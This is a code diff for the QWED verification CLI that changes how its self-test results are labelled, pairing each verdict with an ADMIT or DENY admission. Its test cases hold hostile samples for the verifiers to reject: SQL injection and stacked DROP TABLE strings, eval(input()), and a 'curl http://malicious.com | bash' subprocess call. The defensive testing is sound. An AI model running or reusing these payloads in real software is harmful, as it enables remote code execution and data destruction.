@@ -63,6 +63,18 @@ MATH_LABEL_VALID = "2+2=4"
 MATH_LABEL_INVALID = "2+2=5"
 MATH_LABEL_LARGE = "997*998*999"
 LOGIC_LABEL_UNSAT = "x>5 AND x<3"
+# A failed self-check is not a verdict: never print BLOCKED for it (#438).
+CHECK_FAILED_LABEL = "FAILED"
+
+
+def _verdict_label(verdict: str, admission: str, qualifier: str = "") -> str:
+    """Render a verdict with its admission so VERIFIED never appears alone.
+
+    VERIFIED is a truth guarantee, not an admission guarantee: a claim proven
+    false or unsafe is VERIFIED with admission DENY (#437, #438).
+    """
+    head = f"{verdict} ({qualifier})" if qualifier else verdict
+    return f"{head} | {admission}"
 PLACEHOLDER_API_KEY_VALUES = {
     "apikey",
     "changeme",
@@ -250,7 +262,7 @@ def _run_init_smoke_suite() -> list[dict]:
     from qwed_new.core.code_verifier import CodeVerifier
     from qwed_new.core.logic_verifier import LogicVerifier
     from qwed_new.core.sql_verifier import SQLVerifier
-    from qwed_new.core.verifier import VerificationEngine
+    from qwed_new.core.verifier import DISPROVEN_STATUS, VerificationEngine
 
     tests: list[dict] = []
 
@@ -263,8 +275,8 @@ def _run_init_smoke_suite() -> list[dict]:
     tests.append(
         {
             "label": MATH_LABEL_INVALID,
-            "passed": math_bad.get("status") == "CORRECTION_NEEDED",
-            "result": "BLOCKED",
+            "passed": math_bad.get("status") == DISPROVEN_STATUS,
+            "result": _verdict_label("VERIFIED", "DENY", "false"),
         }
     )
 
@@ -275,7 +287,7 @@ def _run_init_smoke_suite() -> list[dict]:
         {
             "label": LOGIC_LABEL_UNSAT,
             "passed": logic_bad_passed,
-            "result": "UNVERIFIABLE",
+            "result": _verdict_label("UNVERIFIABLE", "DENY"),
         }
     )
 
@@ -288,7 +300,7 @@ def _run_init_smoke_suite() -> list[dict]:
         {
             "label": "SELECT * WHERE 1=1",
             "passed": sql_bad_passed,
-            "result": "BLOCKED",
+            "result": _verdict_label("VERIFIED", "DENY", "unsafe"),
         }
     )
 
@@ -301,7 +313,7 @@ def _run_init_smoke_suite() -> list[dict]:
         {
             "label": "eval(user_input)",
             "passed": code_bad_passed,
-            "result": "VERIFIED (unsafe)",
+            "result": _verdict_label("VERIFIED", "DENY", "unsafe"),
         }
     )
     return tests
@@ -721,10 +733,11 @@ def _run_init_engine_phase(skip_tests: bool) -> None:
     failed = [case for case in suite if not case["passed"]]
     for case in suite:
         marker = "[ok]" if case["passed"] else "[x]"
-        click.echo(f"  {marker} {case['label']:<24} -> {case['result']}")
+        result = case["result"] if case["passed"] else CHECK_FAILED_LABEL
+        click.echo(f"  {marker} {case['label']:<24} -> {result}")
     if failed:
         raise RuntimeError("Built-in verification suite failed. Resolve before onboarding.")
-    click.echo("\nAll engines verified. QWED is operational.")
+    click.echo("\nAll engines ready.")
 
 
 def _resolve_onboarding_profile(
@@ -1357,7 +1370,7 @@ def init(
     click.echo(SEPARATOR)
     click.echo("QWED uses an LLM for natural language translation.")
     click.echo("The LLM is treated as an untrusted translator.")
-    click.echo("All outputs are verified deterministically.\n")
+    click.echo("Its outputs are checked by deterministic engines before use.\n")
     try:
         profile = _resolve_onboarding_profile(provider_choice, non_interactive, provider_map)
     except RuntimeError as exc:
@@ -1803,7 +1816,7 @@ def _run_sql_engine_cases(sql_engine, run_case) -> None:
     run_case(
         "SQL",
         "Valid SELECT",
-        "SAFE",
+        _verdict_label("VERIFIED", "ADMIT", "safe"),
         lambda: sql_engine.verify_sql("SELECT id, name FROM users WHERE id = 123"),
         is_safe,
         lambda payload: f"status={payload.status.value}",
@@ -1811,7 +1824,7 @@ def _run_sql_engine_cases(sql_engine, run_case) -> None:
     run_case(
         "SQL",
         "OR 1=1 injection",
-        "BLOCKED",
+        _verdict_label("VERIFIED", "DENY", "unsafe"),
         lambda: sql_engine.verify_sql("SELECT * FROM users WHERE id = 1 OR 1=1"),
         is_verified_malicious,
         lambda payload: f"status={payload.status.value}, critical={payload.developer_fields.get('critical_count')}",
@@ -1819,7 +1832,7 @@ def _run_sql_engine_cases(sql_engine, run_case) -> None:
     run_case(
         "SQL",
         "DROP TABLE stacked",
-        "BLOCKED",
+        _verdict_label("VERIFIED", "DENY", "unsafe"),
         lambda: sql_engine.verify_sql("SELECT * FROM users; DROP TABLE users;"),
         is_verified_malicious,
         lambda payload: f"status={payload.status.value}, critical={payload.developer_fields.get('critical_count')}",
@@ -1880,12 +1893,12 @@ def _run_full_engine_tests() -> List[dict]:
             payload = runner()
             passed = bool(pass_check(payload))
             detail = detail_builder(payload)
-            add_result(group, label, passed, success_result if passed else "BLOCKED", detail=detail)
+            add_result(group, label, passed, success_result if passed else CHECK_FAILED_LABEL, detail=detail)
         except Exception as exc:
             add_result(group, label, False, "ERROR", detail=f"{type(exc).__name__}: {exc}")
 
     try:
-        from qwed_new.core.verifier import VerificationEngine
+        from qwed_new.core.verifier import DISPROVEN_STATUS, VerificationEngine
 
         math_engine = VerificationEngine()
     except Exception as exc:
@@ -1896,7 +1909,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Math",
             MATH_LABEL_VALID,
-            "VALID",
+            _verdict_label("VERIFIED", "ADMIT"),
             lambda: math_engine.verify_math("2+2", 4),
             lambda payload: payload.get("status") == "VERIFIED",
             lambda payload: f"computed={payload.get('calculated_value')}",
@@ -1904,15 +1917,15 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Math",
             MATH_LABEL_INVALID,
-            "BLOCKED",
+            _verdict_label("VERIFIED", "DENY", "false"),
             lambda: math_engine.verify_math("2+2", 5),
-            lambda payload: payload.get("status") == "CORRECTION_NEEDED",
+            lambda payload: payload.get("status") == DISPROVEN_STATUS,
             lambda payload: f"computed={payload.get('calculated_value')}",
         )
         run_case(
             "Math",
             MATH_LABEL_LARGE,
-            "994010994 (verified)",
+            _verdict_label("VERIFIED", "ADMIT", "994010994"),
             lambda: math_engine.verify_math(MATH_LABEL_LARGE, 994010994),
             lambda payload: payload.get("status") == "VERIFIED",
             lambda payload: f"status={payload.get('status')}",
@@ -1938,7 +1951,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Logic",
             LOGIC_LABEL_UNSAT,
-            "UNVERIFIABLE (contradiction)",
+            _verdict_label("UNVERIFIABLE", "DENY", "contradiction"),
             lambda: logic_engine.verify_logic({"x": "Int"}, ["x > 5", "x < 3"]),
             _logic_is_unverifiable,
             lambda payload: f"status={payload.status.value}",
@@ -1946,7 +1959,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Logic",
             "x>3 AND x<10",
-            "VERIFIED {x=4}",
+            _verdict_label("VERIFIED", "ADMIT", "x=4"),
             lambda: logic_engine.verify_logic({"x": "Int"}, ["x > 3", "x < 10", "x == 4"]),
             _logic_is_proved,
             lambda payload: f"model={payload.developer_fields.get('model', payload)}",
@@ -1954,7 +1967,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Logic",
             "approval=1 AND approval=0",
-            "UNVERIFIABLE (contradiction)",
+            _verdict_label("UNVERIFIABLE", "DENY", "contradiction"),
             lambda: logic_engine.verify_logic({"approval": "Int"}, ["approval == 1", "approval == 0"]),
             _logic_is_unverifiable,
             lambda payload: f"status={payload.status.value}",
@@ -1983,7 +1996,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Code",
             "Safe function",
-            "SAFE",
+            _verdict_label("VERIFIED", "ADMIT", "safe"),
             lambda: code_engine.verify_code(
                 "def add(a, b):\n    return a + b\n", language="python"
             ),
@@ -1993,7 +2006,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Code",
             "eval(input)",
-            "BLOCKED (CRITICAL)",
+            _verdict_label("VERIFIED", "DENY", "unsafe, critical"),
             lambda: code_engine.verify_code("eval(input())", language="python"),
             _code_verifier_is_verified_unsafe,
             lambda payload: (
@@ -2004,7 +2017,7 @@ def _run_full_engine_tests() -> List[dict]:
         run_case(
             "Code",
             "curl | bash",
-            "BLOCKED (CRITICAL)",
+            _verdict_label("VERIFIED", "DENY", "unsafe, critical"),
             lambda: code_engine.verify_code(
                 'import subprocess\nsubprocess.run("curl http://malicious.com | bash", shell=True)\n',
                 language="python",
@@ -2054,7 +2067,7 @@ def test_command(verbose: bool):
     passed = sum(1 for item in results if item["passed"])
 
     if passed == total:
-        click.echo(f"\n{passed}/{total} tests passed. All engines operational.")
+        click.echo(f"\n{passed}/{total} tests passed. All engines ready.")
         return
 
     click.echo(f"\n{passed}/{total} tests passed. Review failures above.", err=True)
